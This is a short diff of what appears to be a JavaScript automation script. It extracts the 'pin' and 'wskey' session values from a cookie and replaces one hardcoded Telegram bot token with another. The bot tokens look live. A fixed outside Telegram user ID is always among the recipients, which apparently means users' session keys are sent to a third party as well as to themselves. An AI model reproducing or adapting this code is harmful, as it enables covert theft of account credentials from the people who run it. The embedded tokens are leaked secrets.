@@ -12,7 +12,7 @@ const pin = CK.match(/pin=([^=;]+?);/)[1];
 const key = CK.match(/wskey=([^=;]+?);/)[1];
 const _TGUserID = $.getData('JDGiaoBot');
 
-$.TGBotToken = '7317719510:AAG3qbEYQ5AYZqJX2GZJk-t4I0ov0IR-OPk';
+$.TGBotToken = '8235119091:AAFFADuWJAW9Ivjz2L2D-AVAmldzpwaKhzk';
 $.TGUserIDs = [7070580063];
 if (_TGUserID) {
   $.TGUserIDs.push(_TGUserID);
